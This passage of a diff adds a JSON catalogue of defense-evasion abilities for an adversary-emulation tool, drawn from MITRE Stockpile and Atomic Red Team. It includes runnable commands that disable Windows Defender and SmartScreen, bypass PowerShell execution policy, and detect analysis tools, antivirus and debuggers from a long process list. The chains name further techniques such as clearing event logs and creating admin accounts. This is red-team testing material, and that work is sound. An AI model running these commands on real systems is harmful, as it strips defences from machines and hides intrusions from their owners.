+      "command": "chmod 755 #{stockpile_evasion_1222_002_host_dir_staged}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "fd120acf-7468-4a9b-8ead-165cac46ecfa",
+      "source_path": "data/abilities/defense-evasion/fd120acf-7468-4a9b-8ead-165cac46ecfa.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin",
+      "source_requirements": [
+        {
+          "plugins.stockpile.app.requirements.paw_provenance": [
+            {
+              "source": "host.dir.staged"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "STOCKPILE - T1484.001 - LockBit Black - Modify Group policy settings -reg (Generated from Atomic Red... [Windows/PowerShell]",
+      "name": "STOCKPILE - T1484.001 - LockBit Black - Modify Group policy settings -reg (Generated from Atomic Red... [Windows/PowerShell]",
+      "description": "Ability for Domain or Tenant Policy Modification: Group Policy Modification (ATT&CK T1484.001). \nModifies the group policy settings using reg.exe.\nGenerated from Atomic Red Team procedures (9ab80952-74ee-43da-a98c-1e740a985f28); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1484.001",
+      "technique_name": "Domain or Tenant Policy Modification: Group Policy Modification",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f;\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f;\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f;\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f;\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f;\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f;",
+      "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /f;\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /f;\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /f;\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /f;\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /f;\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /f;",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "4adc428b-f60e-4c2c-9653-fb64457d3ad7",
+      "source_path": "data/abilities/defense-evasion/4adc428b-f60e-4c2c-9653-fb64457d3ad7.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1497.001 - Check analysis environment processes [Windows/PowerShell]",
+      "name": "STOCKPILE - T1497.001 - Check analysis environment processes [Windows/PowerShell]",
+      "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
+      "tactic": "Defense Evasion",
+      "tcode": "T1497.001",
+      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "$forensicProcesses = @(\n    \"apimonitor-x64\",\n    \"apimonitor-x86\",\n    \"autopsy64\",\n    \"autopsy\",\n    \"autoruns64\",\n    \"autoruns\",\n    \"autorunsc64\",\n    \"autorunsc\",\n    \"binaryninja\",\n    \"blacklight\",\n    \"cff explorer\",\n    \"cutter\",\n    \"de4dot\",\n    \"debugview\",\n    \"diskmon\",\n    \"dnsd\",\n    \"dnspy\",\n    \"dotpeek32\",\n    \"dotpeek64\",\n    \"dumpcap\",\n    \"evidence center\",\n    \"exeinfope\",\n    \"fakedns\",\n    \"fakenet\",\n    \"ffdec\",\n    \"fiddler\",\n    \"fileinsight\",\n    \"floss\",\n    \"gdb\",\n    \"hiew32demo\",\n    \"hiew32\",\n    \"hollows_hunter\",\n    \"idaq64\",\n    \"idaq\",\n    \"idr\",\n    \"ildasm\",\n    \"ilspy\",\n    \"jd-gui\",\n    \"lordpe\",\n    \"officemalscanner\",\n    \"ollydbg\",\n    \"pdfstreamdumper\",\n    \"pe-bear\",\n    \"pebrowse64\",\n    \"peid\",\n    \"pe-sieve32\",\n    \"pe-sieve64\",\n    \"pestudio\",\n    \"peview\",\n    \"ppee\",\n    \"procdump64\",\n    \"procdump\",\n    \"processhacker\",\n    \"procexp64\",\n    \"procexp\",\n    \"procmon\",\n    \"prodiscoverbasic\",\n    \"py2exedecompiler\",\n    \"r2agent\",\n    \"rabin2\",\n    \"radare2\",\n    \"ramcapture64\",\n    \"ramcapture\",\n    \"reflector\",\n    \"regmon\",\n    \"resourcehacker\",\n    \"retdec-ar-extractor\",\n    \"retdec-bin2llvmir\",\n    \"retdec-bin2pat\",\n    \"retdec-config\",\n    \"retdec-fileinfo\",\n    \"retdec-getsig\",\n    \"retdec-idr2pat\",\n    \"retdec-llvmir2hll\",\n    \"retdec-macho-extractor\",\n    \"retdec-pat2yara\",\n    \"retdec-stacofin\",\n    \"retdec-unpacker\",\n    \"retdec-yarac\",\n    \"rundotnetdll\",\n    \"sbiesvc\",\n    \"scdbg\",\n    \"scylla_x64\",\n    \"scylla_x86\",\n    \"shellcode_launcher\",\n    \"solarwindsdiagnostics\",\n    \"sysmon64\",\n    \"sysmon\",\n    \"task explorer\",\n    \"task explorer-x64\",\n    \"tcpdump\",\n    \"tcpvcon\",\n    \"tcpview\",\n    \"vboxservice\",\n    \"win32_remote\",\n    \"win64_remotex64\",\n    \"windbg\",\n    \"windump\",\n    \"winhex64\",\n    \"winhex\",\n    \"winobj\",\n    \"wireshark\",\n    \"x32dbg\",\n    \"x64dbg\",\n    \"xwforensics64\",\n    \"xwforensics\",\n    \"redcloak\",\n    \"avgsvc\",\n    \"avgui\",\n    \"avgsvca\",\n    \"avgidsagent\",\n    \"avgsvcx\",\n    \"avgwdsvcx\",\n    \"avgadminclientservice\",\n    \"afwserv\",\n    \"avastui\",\n    \"avastsvc\",\n    \"aswidsagent\",\n    \"aswidsagenta\",\n    \"aswengsrv\",\n    \"avastavwrapper\",\n    \"bccavsvc\",\n    \"psanhost\",\n    \"psuaservice\",\n    \"psuamain\",\n    \"avp\",\n    \"avpui\",\n    \"ksde\",\n    \"ksdeui\",\n    \"tanium\",\n    \"taniumclient\",\n    \"taniumdetectengine\",\n    \"taniumendpointindex\",\n    \"taniumtracecli\",\n    \"taniumtracewebsocketclient64\"\n);\n\nfunction Find-ForensicProcesses {\n    param (\n        $ForensicProcessList\n    );\n    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;\n    foreach ($proc in $CurrentProcesses) {\n        foreach ($forensicProc in $ForensicProcessList) {\n            if ($proc.name -like $forensicProc) {\n                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;\n                Write-Host \"[!] Forensic process found: \" $proc.Name;\n                Write-Host \"[!] Path: \" $procPath.Path;\n            }\n        }\n    }\n}\n\nFind-ForensicProcesses($forensicProcesses);",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "7a6ba833-de40-466a-8969-5c37b13603e0",
+      "source_path": "data/abilities/defense-evasion/7a6ba833-de40-466a-8969-5c37b13603e0.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1497.001 - Virtual or Real [Windows/PowerShell]",
+      "name": "STOCKPILE - T1497.001 - Virtual or Real [Windows/PowerShell]",
+      "description": "Determine if the system is virtualized or physical",
+      "tactic": "Defense Evasion",
+      "tcode": "T1497.001",
+      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "get-wmiobject win32_computersystem | fl model",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81",
+      "source_path": "data/abilities/defense-evasion/5dc841fd-28ad-40e2-b10e-fb007fe09e81.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1497.003 - 1-min sleep [Linux/Bash]",
+      "name": "STOCKPILE - T1497.003 - 1-min sleep [Linux/Bash]",
+      "description": "Pause all operations to avoid making noise",
+      "tactic": "Defense Evasion",
+      "tcode": "T1497.003",
+      "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "sleep 60",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "36eecb80-ede3-442b-8774-956e906aff02",
+      "source_path": "data/abilities/defense-evasion/36eecb80-ede3-442b-8774-956e906aff02.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1497.003 - 1-min sleep [Windows/PowerShell]",
+      "name": "STOCKPILE - T1497.003 - 1-min sleep [Windows/PowerShell]",
+      "description": "Pause all operations to avoid making noise",
+      "tactic": "Defense Evasion",
+      "tcode": "T1497.003",
+      "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "sleep 60",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "36eecb80-ede3-442b-8774-956e906aff02",
+      "source_path": "data/abilities/defense-evasion/36eecb80-ede3-442b-8774-956e906aff02.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1497.003 - 1-min sleep [macOS/Bash]",
+      "name": "STOCKPILE - T1497.003 - 1-min sleep [macOS/Bash]",
+      "description": "Pause all operations to avoid making noise",
+      "tactic": "Defense Evasion",
+      "tcode": "T1497.003",
+      "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [],
+      "command": "sleep 60",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "36eecb80-ede3-442b-8774-956e906aff02",
+      "source_path": "data/abilities/defense-evasion/36eecb80-ede3-442b-8774-956e906aff02.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1562.001 - Bypass PowerShell ExecutionPolicy [Windows/PowerShell]",
+      "name": "STOCKPILE - T1562.001 - Bypass PowerShell ExecutionPolicy [Windows/PowerShell]",
+      "description": "Ensure the ExecutionPolicy is turned to Bypass",
+      "tactic": "Defense Evasion",
+      "tcode": "T1562.001",
+      "technique_name": "Impair Defenses: Disable or Modify Tools",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n$shell = New-Object -ComObject Wscript.Shell\nSet-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e",
+      "source_path": "data/abilities/defense-evasion/3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1562.001 - Disable Windows Defender All [Windows/PowerShell]",
+      "name": "STOCKPILE - T1562.001 - Disable Windows Defender All [Windows/PowerShell]",
+      "description": "Disable Windows Defender All",
+      "tactic": "Defense Evasion",
+      "tcode": "T1562.001",
+      "technique_name": "Impair Defenses: Disable or Modify Tools",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;",
+      "cleanup_command": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "b007f6e8-4a87-4440-8888-29ceab047d9b",
+      "source_path": "data/abilities/defense-evasion/b007f6e8-4a87-4440-8888-29ceab047d9b.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1562.001 - Disable Windows Defender Real-Time Protection [Windows/PowerShell]",
+      "name": "STOCKPILE - T1562.001 - Disable Windows Defender Real-Time Protection [Windows/PowerShell]",
+      "description": "Disable Windows Defender Real-Time Protection",
+      "tactic": "Defense Evasion",
+      "tcode": "T1562.001",
+      "technique_name": "Impair Defenses: Disable or Modify Tools",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};",
+      "cleanup_command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) { Set-MPPreference -DisableRealtimeMonitoring 0; } else { $service = Get-Service WinDefend -ErrorAction SilentlyContinue; if ($service) { Start-Service WinDefend; } else { echo \"Windows Defender service not found.\"; exit 1; }; };",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "49470433-30ce-4714-a44b-bea9dbbeca9a",
+      "source_path": "data/abilities/defense-evasion/49470433-30ce-4714-a44b-bea9dbbeca9a.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1622 - Detect a Debugger Presence in the Machine (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "name": "STOCKPILE - T1622 - Detect a Debugger Presence in the Machine (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Ability for Debugger Evasion (ATT&CK T1622).\nDetects a running debugger process or if the debugger is attached to a process via PowerShell.\nGenerated from Atomic Red Team procedures (58bd8c8d-3a1a-4467-a69c-439c75469b07); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1622",
+      "technique_name": "Debugger Evasion",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "$debuggerProcesses = Get-Process | Where-Object {\n  $_.ProcessName -match \"dbg\" -or $_.ProcessName -match \"debug\" \n};\necho $debuggerProcesses;\n$debuggingFlags = [System.Diagnostics.Debugger]::IsAttached;\necho $debuggingFlags;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "252889e4-66f9-4c53-a428-dbec9e2b5474",
+      "source_path": "data/abilities/defense-evasion/252889e4-66f9-4c53-a428-dbec9e2b5474.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    }
+  ],
+  "chains": [
+    {
+      "name": "STOCKPILE - T1006 - Read Volume Boot Sector Via DOS Device Path (Generated From Atomic Red Team) [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1006 - Direct Volume Access.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1006",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1006 - Read Volume Boot Sector Via DOS Device Path (Generated From Atomic Red Team) [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1027.010 - Obfuscated PowerShell Invoke MimiKatz [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1027.010 - Obfuscated Files or Information: Command Obfuscation.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1027.010",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1027.010 - Obfuscated PowerShell Invoke MimiKatz [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1036 - Masquerading - System File Copied to Unusual Location (Generated from Atomic... [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1036 - Masquerading.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1036",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1036 - Masquerading - System File Copied to Unusual Location (Generated from Atomic... [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1036.003 - Move Powershell & triage [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1036.003 - Masquerading: Rename Legitimate Utilities.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1036.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1036.003 - Move Powershell & triage [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1036.005 - Masquerading: Match Legitimate Resource Name or Location.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1036.005",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1036.005 - Masquerading: Match Legitimate Resource Name or Location.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1036.005",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1070.001 - Clear Windows Event Logs [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1070.001 - Indicator Removal on Host: Clear Windows Event Logs.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1070.001",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1070.001 - Clear Windows Event Logs [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1070.003 - Avoid logs [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1070.003 - Indicator Removal on Host: Clear Command History.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1070.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1070.003 - Avoid logs [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1070.003 - Avoid logs [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1070.003 - Indicator Removal on Host: Clear Command History.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1070.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1070.003 - Avoid logs [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1070.003 - Avoid logs [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1070.003 - Indicator Removal on Host: Clear Command History.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1070.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1070.003 - Avoid logs [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1070.004 - Deadman - Delete agent file [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1070.004 - Indicator Removal on Host: File Deletion.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1070.004",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1070.004 - Deadman - Delete agent file [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1070.004 - Deadman - Delete agent file [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1070.004 - Indicator Removal on Host: File Deletion.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1070.004",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1070.004 - Deadman - Delete agent file [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1070.004 - Deadman - Delete agent file [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1070.004 - Indicator Removal on Host: File Deletion.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1070.004",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1070.004 - Deadman - Delete agent file [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1078.003 - Valid Accounts: Local Accounts.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1078.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Windows/CMD]",
+      "description": "Single-step MITRE Stockpile chain for T1078.003 - Valid Accounts: Local Accounts.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1078.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Windows/CMD]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1078.003 - Valid Accounts: Local Accounts.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1078.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1112 - Modify Registry of Current User Profile (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1112 - Modify Registry.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1112",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1112 - Modify Registry of Current User Profile (Generated from Atomic Red Team) [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1202 - Indirect Command Execution - pcalua.exe (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1202 - Indirect Command Execution.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1202",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1202 - Indirect Command Execution - pcalua.exe (Generated from Atomic Red Team) [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1222.001 - Enable Local and Remote Symbolic Links via fsutil (Generated from Atomic Red... [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1222.001",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1222.001 - Enable Local and Remote Symbolic Links via fsutil (Generated from Atomic Red... [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1222.002 - File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1222.002",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1222.002 - File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1222.002",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1484.001 - LockBit Black - Modify Group policy settings -reg (Generated from Atomic Red... [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1484.001 - Domain or Tenant Policy Modification: Group Policy Modification.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1484.001",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1484.001 - LockBit Black - Modify Group policy settings -reg (Generated from Atomic Red... [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1497.001 - Check analysis environment processes [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1497.001 - Virtualization/Sandbox Evasion: System Checks.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1497.001",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1497.001 - Check analysis environment processes [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1497.001 - Virtual or Real [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1497.001 - Virtualization/Sandbox Evasion: System Checks.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1497.001",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1497.001 - Virtual or Real [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1497.003 - 1-min sleep [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1497.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1497.003 - 1-min sleep [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1497.003 - 1-min sleep [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1497.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1497.003 - 1-min sleep [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1497.003 - 1-min sleep [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1497.003",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1497.003 - 1-min sleep [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1562.001 - Bypass PowerShell ExecutionPolicy [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1562.001 - Impair Defenses: Disable or Modify Tools.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1562.001",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1562.001 - Bypass PowerShell ExecutionPolicy [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1562.001 - Disable Windows Defender All [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1562.001 - Impair Defenses: Disable or Modify Tools.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1562.001",
+      "tactic": "Defense Evasion",
+      "script_refs": [
